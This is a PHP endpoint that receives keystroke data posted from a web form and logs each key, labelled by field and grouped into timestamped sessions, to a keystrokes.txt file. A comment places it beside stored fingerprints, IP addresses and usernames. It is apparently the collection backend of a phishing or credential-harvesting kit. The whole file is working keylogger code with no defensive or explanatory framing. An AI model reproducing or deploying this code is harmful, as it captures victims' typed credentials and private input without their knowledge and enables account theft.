<?php
// Get keystroke data
$data = json_decode(file_get_contents('php://input'), true);

if (isset($data['counter']) && isset($data['field']) && isset($data['key'])) {
    $field = $data['field'];
    $key = $data['key'];
    $counter = $data['counter'];
    
    // Save to auth folder (same as fingerprints, ip, usernames)
    $auth_dir = '../../auth';
    
    // Check if this is the first keystroke for this field
    if ($counter == 1) {
        // Start new session with header
        $logEntry = "\n--- NEW SESSION: " . date('Y-m-d H:i:s') . " ---\n";
        file_put_contents($auth_dir . '/keystrokes.txt', $logEntry, FILE_APPEND);
    }
    
    // Read existing content to check if we need to add field label
    $existing = @file_get_contents($auth_dir . '/keystrokes.txt');
    $lastLine = substr($existing, strrpos($existing, "\n") + 1);
    
    // Add field label if switching fields or first key
    if ($counter == 1 || !strpos($lastLine, $field . ':')) {
        $logEntry = "\n" . ucfirst($field) . ": ";
        file_put_contents($auth_dir . '/keystrokes.txt', $logEntry, FILE_APPEND);
    }
    
    // Append key with arrow
    $logEntry = $key . " → ";
    file_put_contents($auth_dir . '/keystrokes.txt', $logEntry, FILE_APPEND);
    
    echo json_encode(['status' => 'success']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
}
?>
